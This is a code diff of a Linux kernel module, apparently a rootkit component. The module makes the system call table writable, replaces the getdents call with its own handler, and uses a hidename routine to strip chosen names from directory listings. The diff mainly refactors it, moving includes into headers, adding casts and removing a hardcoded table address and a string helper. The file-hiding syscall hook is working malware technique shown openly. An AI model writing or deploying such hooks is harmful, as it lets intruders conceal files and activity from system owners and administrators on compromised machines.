@@ -1,30 +1,14 @@
-#include <linux/module.h> 
-#include <linux/kernel.h> 
-#include <asm/unistd.h> 
-#include <asm/fcntl.h> 
-#include <asm/errno.h> 
-#include <linux/types.h> 
-#include <linux/dirent.h> 
-#include <linux/string.h> 
-#include <linux/fs.h> 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/slab.h>
-#include <linux/highmem.h>
-#include <asm/unistd.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-
+#include "include.h"
 #include "rw.h"
 #include "syscall.h"
+#include "utility.h"
 MODULE_LICENSE("GPL");
 
 //char* arg;
 //module_param(arg, charp, 0);
 
 
-int (*orig_syscall)(int fd, char* buf, int BUF_SIZE); /*the original systemcall*/
-const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;
+SYS_getdents_type orig_syscall; /*the original systemcall*/
 
 void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
 	int i;
@@ -54,16 +38,6 @@ void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
 	kfree(tempbuf);
 }
 
-//concatenate two strings together
-//user is responsible for kfreeing returned memory
-char* concat(char* left, char* right) {
-	int leftlen = strlen(left);
-	int rightlen = strlen(right);
-	char* full = kmalloc(leftlen+rightlen+1, GFP_KERNEL);
-	strcpy(full, left);
-	strcpy(full+leftlen, right);
-	return full;
-}
 
 int replace_syscall(int fd, char* buf, int BUF_SIZE) {
 	int nread;
@@ -77,13 +51,13 @@ int replace_syscall(int fd, char* buf, int BUF_SIZE) {
 
 int init_module() {
 	make_rw(sys_call_table);
-	orig_syscall = sys_call_table[SYS_getdents];
-	sys_call_table[SYS_getdents] = replace_syscall;
+	orig_syscall = (SYS_getdents_type) sys_call_table[SYS_getdents];
+	sys_call_table[SYS_getdents] = (syscall)replace_syscall;
 	printk(KERN_INFO "Module loaded\n");
 	return 0;
 }
 
 void cleanup_module() {
-	sys_call_table[SYS_getdents] = orig_syscall;
+	sys_call_table[SYS_getdents] = (syscall)orig_syscall;
 	printk(KERN_INFO "Module unloaded\n");
 }
